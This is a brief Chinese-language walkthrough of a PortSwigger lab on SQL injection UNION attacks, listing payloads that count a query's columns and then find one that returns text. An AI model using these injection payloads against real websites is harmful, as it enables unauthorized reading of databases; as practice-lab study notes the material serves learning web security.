https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

比照 https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns 的解法算有幾個 column

```
' UNION SELECT NULL -- abc		Internal Server Error
' UNION SELECT NULL, NULL -- abc	Internal Server Error
' UNION SELECT NULL, NULL, NULL -- abc	有三個 column 回傳
```

找到回傳的數量後就可以開始找型態，由於 information_schema 的資料是字串，故我們想找字串型態的回傳值

```
' UNION SELECT 'meow', NULL, NULL -- abc	Internal Server Error
' UNION SELECT NULL, 'meow', NULL -- abc	success
```

note 此 LAB 指令要 union 的字串
